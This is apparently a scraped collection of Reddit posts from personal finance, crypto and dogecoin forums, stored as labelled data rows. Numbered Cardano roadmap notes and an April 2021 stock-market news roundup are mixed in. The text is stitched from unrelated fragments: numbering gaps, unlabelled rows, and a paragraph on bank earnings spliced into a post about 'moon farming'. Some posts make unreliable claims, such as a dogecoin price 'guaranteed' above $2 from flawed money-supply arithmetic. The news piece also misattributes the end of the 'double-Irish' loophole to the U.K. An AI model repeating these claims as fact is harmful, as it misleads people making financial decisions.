33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
49. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.

53. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
54. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.

60. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

personalfinance,Pay off car or save towards a down payment on a house?,"I'm in the process of paying down my credit card debt, which is currently at around $7800, and will have that paid off by the end of this year. I wasn't careful with my spending on the credit cards and let them get out of control, but have been chipping down at the debt for the last 6-8 months, and have it down from a balance of around $13,000. I also haven't spent anything on the credit cards in that time without paying it off immediately in addition to the regular amount that I've been paying on them. 

At the end of the year I'll be getting a bonus that will probably come to about $6500 after taxes and I currently have $3000 in savings/emergency fund. My car loan is currently at about $8500 with an interest rate of 4.125% and a payment of $331 a month and my student loans are at about $53,000 with a payment of about $700 a month. At my current rate I'm paying about $1000 a month towards credit cards, and hope to buy a house in the next 2-5 years, which will probably be in the range of $350-450K.

The real estate market is hot right now and home prices are inflated, so I'd rather wait until there's a lull in the market and see what's available, but I've weighed my options and would be able to buy with as low as 5 or 6% for down payment and closing on an FHA mortgage. As a first time home buyer there are also certain down payment assistance programs available in my city and rates are low right now, but with the heat of the market it's hard to get into anything at asking price and there's very limited opportunities in my price range unless I want to get something that I'll have to put considerable work into (which isn't off the table but isn't the ideal situation).

Would it be better for me to take the $1000 a month or so that I'm spending on credit cards and the $10,000 (savings and bonus) that I'll have at the end of the year and pay off the car once the credit cards are done then start back towards building up a down payment with that extra $330 a month included, or would it be a wiser move to continue paying on the car monthly and hang onto the savings so that I can move quickly if the market cools down a bit?

At the rate that I'm saving I'll be able to put about $18,500 a year towards my down payment savings, so if I paid the car off I'd have somewhere in the range of $20K available at the end of next year, when I'd be most interested in starting to shop for houses. If I don't pay the car off, though, I'll probably have somewhere in the range of $30-35K saved up, but a higher DTI since I'd still have a portion of the car loan outstanding.",finance

personalfinance,Should I pay off my car loan in full?,"A bit of background - I'm 27, and just now trying to start getting my finances in order. I owe ~$6k on a car loan at 8%, no CC debt or other outstanding debt. Hoping to get an IRA started up by the end of the year, and looking to buy a house in the next 2-3 years. My credit is decent (not excellent, but certainly not terrible). 

I've been making the regular payment for the length of the loan since purchasing the car, although I do have the pay off amount just sitting in my accounts. I bought the car at the end of 2019, and felt like I should value liquid assets through 2020 as job prospects were so tenuous, etc. I'm still comfortably employed, spending less than 30% of my income on rent, and likely not moving until I'm ready to buy. 

So should a person in my position prioritize retirement investment, or getting out of debt first? I feel like the 8% interest rate certainly leans heavier on the side of pay down the car first, but I've had trouble with a scarcity mindset in regards to finances, so it makes dropping all of the money (or significantly higher portions of the payment each month) a bit terrifying. 

Happy for any advice you can give!",finance

Bitcoin,People keep assuming they've missed the Bitcoin boat.. so inadvertently they keep missing the boat!,"If you think you've ""missed out"" on Bitcoin or are too late to the party you haven't/ aren't.

Over the years the perception from no-coiners has always been.. how lucky those in crypto have been and that they've some how missed the boat.

The crazy thing is that many of those people could have got in at as low as around $5k just over a year ago.

I've been a firm believer that one day in our lifetimes 1 BTC = $1 million 

Today's price of $56k is therefore cheap! 

The boat is still very much still in the docks taking on passengers :D

These are some of the metrics I always keep in mind...

Bitcoin is only 12 years old, there's still almost 120 years to go until the last Bitcoin is mined.

A UN population division projected the worlds Global population to have nearly doubled to 11 billion in 2100, from 6 billion in 2000.

By 2140, only 21m will have been mined of which many will have been lost.

In 2019, there were an estimated 46.8 million people who's assets exceeded $1m and the total net worth of all millionaires stood at $158,261 trillion.

The cumulative inflation from 1921 to 2021 is 1379.8% therefore a bitcoin purchased for $56k in 1921 would cost $828,665 today.

Bitcoins market cap is just over $1 trillion, in the last year alone the Fed/ECB combined have printed $3 trillion. 

The other common misconception is that those that have invested are all ""lucky"".

Bitcoin is high risk... analysing the maths, researching technology/ history, early investing over the longframe and dollar cost averaging only what you can afford to lose.. is a skill.

Bitcoin investing isn't a get rich quick scheme for the lucky.. it's an ideological way of life, for the patient, methodical and early adopting believers out there.

personalfinance,Does it look bad to move loan money too much?,"Hello! I’m currently getting through 2 loans that I have taken out. I recently requested an increase on one of my credit card limits (just in case, I have a 0 balance), and I refinanced my car loan going from 6.5% to 2.5%. I currently have a personal loan taken out to consolidate some debt and combine everything to one payment with a much lower interest rate. I got this loan in November 2020 at 12% and I noticed through my credit union that my car is financed through currently that I am preapproved for a personal loan at 6.5%. 

So my question is, will it reflect badly on my credit if I were to take out this new personal loan to replace the one with higher interest given I’ve also had a credit limit increase, taken out a personal loan already, opened a new credit card (also always paid in full each month), and refinanced my car all within a 6 month period?",finance

**Week of 4/19/21**

The S&amp;P500 opened Monday 4/19/21 at 4179.80, just below the previous close of 4185.67 on Friday4/16/21. Bitcoin is currently trading at 55724.20, down from $60,309.40 last Monday 4/12/21.

Apple (AAPL) and Facebook (FB) prepare to square up over the social media platforms controversialtracking of consumer data. Facebook, which generates a large portion of its profits from targeted advertising, is known to collect consumer data to deliver the ads it believes will be the most successful. Apple has been in the process of developing what it calls “App Tracking Transparency,” for its devices and announced in January that the feature will be included and enabled by default on all new Apple operating systems. The technology, which was tested publicly in summer of 2020, will prevent applications like Facebook and Instagram from being able to collect user data. Facebook has begun preparations to sue Apple, who is currently in the midst of a lawsuit over App Store payments for the popular online game, Fortnite.

Apple CEO Tim Cook spoke on the issue following statements from Facebook CEO Mark Zuckerberg citing Apple as their, “biggest competitor.” Tim appeared committed to continuing to roll out the technology, saying, “Technology does not need vast troves of personal data, stitched together across dozens of websites and apps, in order to succeed. Advertising existed and thrived for decades without it. And we’re here today because the path of least resistance is rarely the path of wisdom.

Apple will hold its first product showcase of the year tomorrow, 4/20/21. The technology frontrunner is suspected to unveil our first glimpses of consumer-grade Augmented Reality technologies. The product showcase comes on the heels of a great month for the emerging AR industry, which was just the subject of a $20 Billion military contract with Microsoft. Apple is up 0.86% on the market open.

Emerging fitness company Peloton (PTON) traded down 5% on the open following federal regulators warnings against treadmills sold by the company. The Consumer Product Safety Commission released statements April 17th warning parents of children and pet owners to exercise caution after the death of a child who became wedged underneath the machine. At least 40 incidents of injury related to the machine have been recorded since its release.

Reports of Google (GOOG) using foreign tax loopholes to evade taxes have emerged. The company reportedly used the “double-Irish,” loophole to funnel over 100 Billion in profits through Ireland and into Bermuda in 2018 &amp; 2019, allowing the company to collect the profits free of U.S. taxation. The loophole was addressed and abolished by the U.K. in 2015, however the nature of the change to legislation still allows companies established before it’s passing to exploit the loophole. A spokeswoman for Google indicated that the loophole is no longer being used by the company, and that the U.S. taxes avoided by using the loophole would have amounted to approximately 80% of all taxes levied against the profits.

The September 2020 agreement to merge NVIDIA (NVDA) and ARM Ltd. is currently in limbo as U.K. regulators have released statements intervening in the acquisition. The merger, which was negotiated by NVIDIA and SoftBank, is worth approximately $40 Billion. The intervention was released this morning, 4/19/21, and carries with it the stipulation that a full federal investigation be conducted and completed by the end of July 30th, 2021. The state of the deal is uncertain as markets await a press release from NVIDIA.

JP Morgan (JPM) has displayed considerable interest in funding a new professional soccer league in Europe. The European Super League, which was announced on Sunday by a dozen of the world’s largest football clubs, will be established to rival the current European Champions League, and will consist of 12 of Europe’s leading clubs, mostly from Spain and the U.K. A spokeswoman for JP Morgan confirmed in an email that it would be involved in funding the league, but the amount in which JP Morgan will be contributing is still unknown. JP Morgan posted earnings of 12.61 last week and was up 0.5% on the market open.

CryptoCurrency,"These are ""The Good Old Daze."" And they won't last forever.","I can't help but recall the mid-late 90's. The dotcom euphoria. I made a killing working in not one, but 2 startups. And the stock market seemed to have no ceiling. I made a ton of money and lost a ton when it crashed. But I sure do look back at those times with fondness. Those were heady days. 

FFWD 20 years.. I have several friends who are new to crypto and have made out pretty well with Doge. Doge is the reason they got in. One of them was even smart enough to take some profits. But now other friends are going in balls deep. These people have no idea what they are doing. And they really don't care. Despite my words of caution, they are FOMOing in bigly. And I worry for them. 

I worry the Doge implosion will be bad. Really bad. A lot of people will get rekt. And as sad as that makes me, I'm most concerned that the flaming bag of dogeshit on the porch. The Feds coming out and stomping on it. And using the mess as a reason to clamp down on Crypto. At the very least, the Doge meltdown will be a black eye on the broader Crypto space. Scaring the masses from adoption. At worst, Congressional hearings leading to laws and regulations that stifles innovation, slows adoption, and kills gains. 

My portfolio (diversified) is doing very well thank you. And I'm still very bullish. This dip is a healthy opportunity. It doesn't bother me a bit. But... I'm really getting very concerned about Doge. I love seeing people make money. I really do. Especially my friends. But I don't think this will end well. The Dogeshit storm could bring the crypto winter before its time... I really hope I'm wrong, but I know from experience.. ""The Good Old Daze"" won't last forever. 

If you are new to all of this.. please understand what you are investing into. Have targets and an exit plan. And stick to it.  

I wish you huge profits.",cryptocurrency

personalfinance,"Buying a house in HCOL, is this reasonable?","My wife and I (24) are thinking of buying a home in the South Bay, eyeing houses around the 1.3M to 1.5M range. Thinking of entering the market because
1) speculation that the demand is going to rise more as covid does down
2) low interest rates 
3) we have been living with my mother in law who does not like our cats, so the cats are confined to our bedroom. I want to give them the space to run around. 
4) because of point 3, long-term exposure to cat hair (particularly when sleeping) is causing my wife some health problems. The plan is to allow the cats to roam the rest of the house but keep the master bedroom off limits. 

I wanted to run the numbers by some of you to make sure I'm not digging myself a grave. Here are the stats:

My wife has a very stable 80k/year job that she is guaranteed to have for the next several decades, and will be 90k/year in just a few years. She takes home approximately 5,000/month. No debt. Has about 12,000 in IRAs, but access to a pension later. 

I have a reasonably stable 180k/year job. In my last paycheck I took home $200, because of retirement contributions, but I can reasonably take home 10,000/month once I max out my contributions or deprioritize. No debt, and I have a newish car that won't need repairs or costly maintenance anytime soon. I have about 90,000 in 401k/IRAs.

We have a joint 200k in stocks/bonds and an additional 250k~ in easily accessible or cash savings. I can reasonably put down 20% on a 1.5M offer. 

I did a few pre-approvals and we'd have a monthly payment of about $7000, including taxes and insurance, which is pretty much 33% pretax (and nearly 50% of our take home). The house we're looking at has a great plot of land but definitely will need some remodeling for the kitchen. 

This is a huge purchase, so I wanted to get some opinions from strangers. Anything I should watch out for? Thanks in advance.",finance

personalfinance,Personal loans for grad school abroad,"I (an American) have been accepted into a one year masters program in Austria. I need to obtain a Student Resident Permit due to the length of the program. I was granted a partial tuition waiver, but no monthly stipend from the school. Either way, going here will be far less expensive than to the school I was accepted to in the US. One of the requirements is that I must have proof of funds of at least **€1000.40/month** (approximately $15k US with recent conversion rates) in a bank account accessible to me. I currently have just over $9.2k saved safely, and will add to it each week as I am paid weekly (It will be at least $200+/week, if not more depending on the week).

I have little doubt that by September I can come up with the needed money, since in addition to whatever I save from work, I will also get my security deposit back plus whatever I can get from things that I will sell but cannot sell until I am moving (like furniture). Combined, these will total in my estimation to be probably around another $1700 or so.

The kicker is, the program begins in September, and the permit process takes at least three months, so I need to get everything in by the end of May at the very latest from what I understand (neither the embassy nor the internet has been very helpful regarding specifics). So I am left in a sort of a bind. A personal loan of \~$5000 or so does seem like it could be a solution. I have fairly good credit (over 730), and the interest rates that I have seen in ads don't seem too terrible, similar if not lower than my federal loans from undergrad. Private student loans seem to have both a higher interest rate than personal loans and the money would go directly to the school, which doesn't look like it would help my application. With the Student Resident Permit, I also can work for up to 20 hours/week in Austria, which I do plan on doing, so I wouldn't necessarily be falling behind on payments. Is this a decent idea, or is this really dumb? If this is a decent idea, what lenders should I look into or be wary of? Are there other ideas that I am missing?

CryptoCurrency,Ever find yourself wondering about how crypto coins get their start? Maybe you want a calendar to know when they are coming out?,"Time-Tested Tips  
ICOs and the markets for digital assets might seem like the next big thing, but a few basic, time-tested tips can serve you well before you make a decision to invest in any new product or market.  


* Only invest with money you can afford to lose. ICOs are speculative, and you can lose some or all of your investment.
* Practice diversification. This is the equivalent to the proverbial ""don't put all of your eggs in one basket."" Spreading your money across different asset classes such as stocks, bonds, real estate and other investments helps control risk.
* Check out the background and registration status of any individual recommending or selling an investment, including ICOs. You can do that quickly, easily and at no charge with FINRA's [BrokerCheck](http://brokercheck.finra.org/). Check the credentials of any promoters, salespeople, or those mentioned in a white paper: for example, if someone claims to have a PhD in computer science, verify that it is real using [these tips](https://www.ftc.gov/tips-advice/business-center/guidance/avoid-fake-degree-burns-researching-academic-credentials) from the Federal Trade Commission.
* Collect and review information about ICOs from regulators and trusted media outlets. Study the company, including financial documents, executives and employees, organizational structure and business lines.
* Run the investment by others. In the case of ICOs, this might include someone with a strong technology or mathematics background, as well as an experienced investor, CPA or registered investment professional.
* New technologies and media buzz are often the recipe for the latest [pump-and-dump](https://www.finra.org/investors/anatomy-pump-and-dump) scheme. Look out for guarantees, unregistered products, claims of overly consistent returns, complex strategies, missing documentation, account discrepancies and pushy salespeople. All are red flags of potential fraud.

CryptoCurrency,"Celsius Network, BlockFi, Nexo, Crypto.com - What are the risks?","So I've been doing some research on where to store my finances and I've been researching on the interest rates of Cel and Nexo and these other lending type platforms. I understand their business model is lending with crypto as collateral but I'm scratching my head as to how theyre able to give out such good rates for people who deposit crypto. Close to 11% APR for USDC or other stable coins?!? Considering the average stock portfolio gets an annual return of 10% (maybe?), how can these companies offer such great interest return rates?   


With that being said, I'm worried about the risks if this becomes some kinda crypto exit scam. I know people who have used Cel or BlockFi and got their returns on a timely manner. I've also see others on reddit who also found reliability in these companies.

dogecoin,"FOR ANYONE CONCERNED ABOUT THE ""UNLIMITED SUPPLY"" OF DOGECOIN","**TLDR;**  USD is added at a rate of nearly 10B per year, dogecoin is added at a rate of 5B per year, dogecoin valuation set up to exceed $2.  Virtual currency gaining momentum.  HODL.

There seems to be a fundamental misunderstanding of what “unlimited” means with regards to currency. Dogecoin is capped at **5 billion extra coins mineable per year**. As a reference, the US treasury pumps out **&gt;9.8 billion USD per year** and this number typically increases every year \[see math below\]. Dogecoin is also a global currency not tied to the GDP of one country. As countries develop and access to internet and technology improves, crypto becomes more and more relevant. That places the valuation of dogecoin guaranteed to **exceed \~$2** \[again, see math below\]. When it will hit that number is debatable and entirely dependent on mass psychology.

A few things to consider:

\- Global currencies pump out more money per year while **dogecoin is a fixed rate** at 5 billion.

\- The global economy has not yet experienced much if any backlash yet from **pumping trillions of dollars out due to the pandemic**. This degree of influx (although debated by economists) should theoretically cause an inflation that will also push the raw dollar value of the dogecoin higher.

\- This premise is **independent of large scale commercial adoption** to make dogecoin usable. That only affects the speed at which dogecoin will reach its natural price.

\- This premise is, however, **dependent on the continued valuation by the people** (us). As long as we continue to grow the community and believe in the coin, it will have value, because we determine it to have value. therefore **HODLing is in everyone’s best interest**, unless you are trying to ride the waves for more profit (risky, you could miss the rocket boosts and have to buy back in at the new floor).

US Federal Reserve math below is based on 2019 data from the Bureau of Engraving and Printing at the US Department of the treasury. I used 2019 because it was pre-pandemic.

\[Source: [https://www.moneyfactory.gov/resources/productionannual.html\]](https://www.moneyfactory.gov/resources/productionannual.html])

The number of bills printed at each denomination is listed below:

2137600000 \* $1 = $2,137,600,000  
160000000 \* $2 = $32,0000,000  
736000000 \* $5 = $3,680,000,000  
339200000 \* $10 = $3,392,000,000  
1356800000 \* $20 = $27,136,000,000  
224000000 \* $50 = $11,200,000,000  
1484800000 \* $100 = $148,480,000,000

Total printed = $196,345,600,000

95% of this is used to replace unusable currency, 5% added to economy.  Therefore, the added amount is as follows:  $196,345,600,000 x 0.05 = $9,817,280,000

**9.8 billion USD added per year**

**5 billion dogecoin added per year**

**The ratio of influx is 9.8 : 5 = 1.96**. The US dollar holds steady with +9.8B/year, therefore the dogecoin should eventually hold steady at 1.96x the USD. The only thing in contention is time to get there and market fluctuations.

Whether you are long term HODLing or trying to ride the mass psychology waves, investing at any point below 1.96 per dogecoin will eventually make you returns. Eventually, as the world adopts dogecoin and access to crypto increases, *its value will exceed this ratio*. Enjoy the moon, ladies and gents.

dogecoin,"The potential of doge, why is it called ""shit coin""","So amidst all of the hype and excitement I'm seeing for doge, I wanted to have a discussion on what is currently going on for those who don't know or who are new. This is going to be a long post so strap in.

I want to see in the comments your own thoughts as well as if I got anything wrong, so please join in.

So, to start; why was doge the ""meme"" coin? The answer to this is pretty easy, and if you go anywhere other than this subreddit you will see people still saying these things: ""it is unlimited"", ""it has no utility"", ""it is a bad long term investment"", ""it was just a joke"".

All these things were true, to some extent, but lacked a fundamental explanation as to why they were true. Number 1, it is unlimited yes because it was intended to be accessible to all, not just the few. The US dollar is also technically ""unlimited"" the federal reserve and mint are printing new physical currency every day for recirculation as old currency is destroyed. Also, approximately 3%, of the USD exists as physical currency btw. By doing this, they accept and EXPECT a certain level of inflation. Doge is the same way, with 5B new coins being introduced into circulation every year. Now compare this to the trillions of dollars in US circulation alone. A few billion is a drop in the bucket and absolutely capable of skyrocketing globally, giving it almost unlimited potential value.

Number 2 utility. What is utility? In crypto, due to the decentralized nature, the value a currency is assigned by people who are buying and selling it. So, whatever someone wants to sell it for, is it's worth. Now, that being said many other factors come into play to determine what people want to buy and sell it for. For example, bitcoin grew tremendously for 3 reasons (in a nutshell): 1.) Limited availability 2.) Retailers accepting BTC as currency 3.) Media attention resulting from the two previous reasons. Doge is starting to mimic BTC in these ways. The more retailers/merchants that accept doge as payment, the higher people are going to want to buy/sell it for. The more retailers that accept it, the more media attention it is going to get, and more people that start buying/selling it. The more people start buying/selling it the more limited the availability. It's all about patterns and seeing the similarities. As of right now, DOGE is skyrocketing almost solely based on the hype. Because if this it is gathering more and more attention from the media, and soon to follow merchants and retailers. Just imagine if a few larger retailers started to accept Doge, what it would do for the price. Or, imagine if even 1 titan of industry such as Amazon accepted it....

Number 3. It was a bad long term investment, and technically still is. All crypto, due to the inherent nature of volatility is a bad long term investment, even BTC. With new crypto coming out each day, and the literal impossibility of predicting the market, you can never know which one is going to skyrocket, and which is going to tank forever and die. It's all a risk. But with Doge, everyday we are establishing a more secure foothold in the market giving some comfortability in the fact that it's here to stay, and go up from here, but still no guarantee, and not financial advice.

Number 4. It was just a joke, but as we see it's clearly, 'no longer just a joke'. The joke was just a meme face on a coin and even the creator sold his entire share in like 2018 or something. Look at GME, most of wallstreetbets were in it to fuck over hedge funds, but it became a meme. People liked the meme, decided to join in and well, you see what happened. It's funny if you take DOGE to r/cryptocurrency or r/wallstreetbets how they shit on Doge for literally doing the same thing GME did. It's ironic.

Lastly let's take a quick peek at the media. Last year, media attention for DOGE had articles that ""predicted"" best case scenario for doge in 2021 as ""maybe .05"". Well clearly these ""experts"" and ""financial professionals"" still don't understand the power of the internet because they were wrong. How wrong? Well as of today... About 16,000% wrong. 

DOGE is in the cusp of greatness. If just a couple if things happen it will really explode and I believe we are getting close.

personalfinance,"Roth questions, 529, 403b questions","Hey Reddit. First post so bare with me and my generic user name.

Looking for some advice for getting our semi decent financial house in better order. Husband and I are 39 &amp; 40, solid marriage, solid jobs. 3 kids in elementary school.

Rundown:
Income: 95K me, 45K him
Mortgage: owe 135K on a house worth almost 300K. Refi'd in Oct from a 30 year w/20 years remaining to a 15yr with 2.6% rate.

Investments: all thru my jobs, husband's doesn't match so we load mine. Prior job 403b balance: 215K, is still in a vanguard ETF 2045 fund. It's had good returns and I never moved it. New job has 32K in TIAA ETF 2045. Currently with the new job my employer gives 3% automatically then matches additionally up to 4%. I contribute 11% so total contribution is is 18%.

We've been working on paying off 2 cars the past few years. We are now owners of a 2016 highlander and a 2011 yaris, both have super low miles so hope to not need to worry about cars for 10+ years. I work from home and husband takes the yaris 6 miles each way to work.

Now that the cars are paid we have some money freed up, about $800/month additional to invest. We also just renovated our kitchen so the money we were saving each month for that is freed up too.

We do not have an IRA. Roth is on the menu but does it matter where I open it up? I see fidelity on here a lot but I already have vanguard and TIAA retirement accts. Should I convert the old 403b to roth? And put it with which company? Or should I just let the vanguard do it's thing since it's been doing well?

Savings: 40K. We're comfortable with 20K for emergency fund.

Debt/things on the horizon:

I have a 13K federal school loan that's in the covid pause. I've been throwing a couple hundred a month at it but not pulling the trigger on payoff in the event of any forgiveness. 

Roof likely needs attention this year, I expect it'll run 5-7K. We'll be getting quotes soon. 

Hvac system is over 30 years old. We had it serviced last year by a friend/neighbor who said it's in decent shape but when it dies that's it. 8-10k to fix. Womp womp. I'll cross my fingers when it's time to turn on the AC.

No other debt. We use CCs for food and gas and pay off fully each month. We are pretty frugal, no cable, We shop around for the best cell phone plans, car insurance, etc. We do vacation here and there, mostly weekend trips locally. And a bigger beach week every year.

We are lucky in that we have no childcare expenses (we work opposite shifts). Kids go to a really good charter school (free). Now that the cars are paid and we've renovated the kitchen we have a good 2000 monthly for savings/investing that we didn't really have before. Husband was only part time when kids were small due to childcare issues (daycare would've eaten basically all his pay). So now that we're both FT and our short term goals accomplished (kitchen and cars), looking for some guidance.

529? I was thinking about the child tax payments that are supposed to start in July should go in one. What you say? We don't have one currently but would like to help the kids with college some.

I am ready to plunk down 6K for 2020 roth, just wondering which place to get one with. Also wondering if I should move my old 403b. And open a 529. 

Thanks, looking forward to hearing some thoughts!",finance
personalfinance,HELOC or fixed rate loan for a home remodel?,"Hi PF! My husband and I currently live in a 1500sq ft home with 3 bd 2 ba house worth around $1.5m that's fully paid off. It was an investment property of my in-laws that they generously gifted to us when we started the home search. We have been living in the home for the past 5 years (renting from in-laws) and the condition was the gift was that we pay off the remaining mortgage on our house (which was about $250K). 

The market is insane in California right now - inventory is low, properties get multiple offers within 1 day of being listed, and houses often sell for higher than what they originally list for (we live in the Bay Area, California - which is why these numbers are so high :(). 

We are both self employed and make about $175k year together so we think we can pay off this loan within 5-10 years. We have around $200k worth of assets (not counting our retirement funds) we could sell in case worst case scenario something goes south with our jobs.

Our home is sandwiched in between two 2-story homes and gets very little direct light. We want to remodel our home and add in a second floor with a master bed and bath in addition to expanding part of our first floor to further increase square footage of our home. 

We are looking to add 1000 sq ft to our home in total and we are estimating (high side) this remodel will cost $500k. Homes in our area average about $900/sq ft so we think it makes sense to remodel because ultimately it will add more value to our home. We are open to selling this home in the future.

I'm not sure if we should get a HELOC vs a traditional fixed rate loan for our home remodel. My concern with the HELOC is that the interest rates will increase over time as they are at all time lows currently. Should we look for fixed rate loan options to minimize interest payments? What is the best approach to borrow money for this remodel? I've also seen advice on this forum to space out home remodel projects to avoid paying interest, which is another thing I'm open to, but I'd really like to have more space and light in our home as we do plan on having kids soon (within a few years). Anyways, any advice is appreciated and thanks for reading!",finance

CryptoCurrency,Farming Moons beats the minimum wage in many parts of the US,"We all know that moons are a fairly lucrative reward, and that moon farming is a lucrative hobby. But I wondered just *how* lucrative is was. There’s some math coming up: skip to the summary at the end if you don’t care about it.

So lets assume a moon farmer makes 1 comment per minute, which gets 1 upvote. The generic ""Elon Sucks"" and ""just hodl"" will do. Obviously that is a quick commenting time but most moon farmers don't exactly go for quality. I believe these are fairly conservative numbers as some comments could get a lot more upvotes. That means our farmer will be getting about 60 karma per hour. (I know karma doesn't sync 1:1 with upvotes but it's close) With the double on comment karma, that's 120. Last proposal was 0.88 moons / karma, so I'll go with that. That's 105 moons for one hour. At moons current price of 0.07$ usd, one hour of work would net you 7.35$.

That puts the moon farmers salary right above the US federal minimum wage of 7.25$ which is used by seven states. That might not seem that insane, but keep in mind this is the shittiest of the shitposters, who only gets 1 upvote per comment. Imagine someone experienced! This is also probably the least strenuous job ever, it has very flexible hours and can be picked up by anyone. No wonder this sub has been growing like crazy, it's a very profitable use of ones free time!

Even banks continue to report blow out earnings when most expected them to suffer. 

Lastly, the stock market euphoria that covid crisis caused resulted into companies being able to offer tons of additional shares at high prices to pay off debt or expand, market participants mostly didn't care and they just all absorbed the dilutions left and right, insiders were also very happy to sell at high prices. IPO and blank check mania also allowed companies to have ridiculously high valuations so they were able to raise large amount of funds.",finance

CryptoCurrency,Utility token vs Security token,"So as more tokens come out I have to ask if we’re all remembering the SEC consideration of security. I see a lot of tokens giving voting rights to holders and also a holding presales without adhering to utility token rules and I’m worried a lot of people are going to get fucked come tax season and when the SEC starts taking a look at some of these new tokens. Are people getting exemptions or just not giving a shit and hoping it works out? 

In case you’re curious what I’m talking about....

From: https://hackernoon.com/security-tokens-vs-utility-tokens-how-different-are-they-22d6be8901c2

What is a Utility Token?

Utility tokens are simply app coins or user tokens. They enable future access to the products or services offered by a company. Therefore, utility tokens are not created to be an investment.
Just like an electronics dealer might accept orders for a video game that will be released several months later, a startup can create utility tokens and sell digital coupons for the services or products it is developing.
A good example is Filecoin, which raised $257 million through the sale of tokens. These tokens will allow users access to its decentralized cloud storage platform.

What is a Security Token?

A security token is a digital asset that derives its value from an external asset that can be traded. Therefore, these tokens are subject to federal laws that govern securities. Failure to comply with these regulations could result in severe consequences including penalties and potential derailment of the development of a project.

On the other hand, security tokens can offer a vast array of applications if the startup abides by all the regulatory requirements. The most promising of these features is the ability to offer tokens as a digital representation of shares of a company’s stock.",cryptocurrency

Many of these apps make it so easy to buy, Buy, BUY, BUY!!! on credit.  Please be financially responsible with credit, being in debt is no joke.

Sure, your logic might say ""it's going to moon"" or ""if it goes up 40%""... but the average credit card interest rate is 20.29%

CryptoCurrency,"Dogecoin is a clone of the federal reserve. Bitcoin is the opposite. Choose wisely. ""They can only control us because we use their currency.""","Title. Stop and think about that for a minute. I think I read the the other day: once every 80 days, a total of 1 billion new dogecoin are created.                  

Let's actually simplify this with a new token as an example:  SargeCoin.                    
Sargecoin has 1 billion USD of marketcap and 1 billion tokens. therefore, 1 token = 1 USD.                   

But lets take 2 scenarios on printing theory in to account...                
If we assume I can't print more SargeCoin, then as more people buy sargecoin, the value goes up. If it hits 2 billion USD market cap, each SargeCoin becomes worth 2 USD, 3 billion USD market cap, each SargeCoin is 3 USD, and so on.                     

If we assume I can print more SargeCoin (let's say 1 billion every 80 days), then the amount of money that needs to enter SargeCoin **just to maintain 1 USD, I might add** doubles once every 80 days. So that 1 billion USD marketcap must become a 2 billion USD market cap 80 days later. Then 3 billion USD 80 days later, and so on.                   

The latter scenario indicates that **in order for you to make profit, absurd amounts of money must enter dogecoin in very short amounts of time.**

btc,Let's have a serious conversation about deflationary currency,"This is going to be a long one, so strap yourselves in. I actually tried to do some research on this, but couldn’t find a whole lot. If anyone could recommend something, would be appreciated. Since I can’t find anything, it’s time to turn to you guys.

